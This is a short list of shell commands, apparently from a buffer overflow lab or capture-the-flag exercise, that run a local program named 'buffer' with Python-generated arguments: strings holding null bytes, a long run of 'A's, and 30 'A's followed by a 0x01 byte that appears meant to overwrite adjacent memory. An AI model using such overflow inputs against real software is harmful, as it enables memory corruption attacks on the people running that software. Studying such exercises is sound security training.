# ./buffer $(python -c "print(('ABC' + '\x00' + 'DEF'))" 

./buffer ABCD $(python -c "print(('ABC' + '\x00' + 'DEF'))" )

./buffer ABCD AAAAAAAAAAAAAAAAAAAAAA 

./buffer ABCD $(python -c "print('A' * 30 + '\x01')" )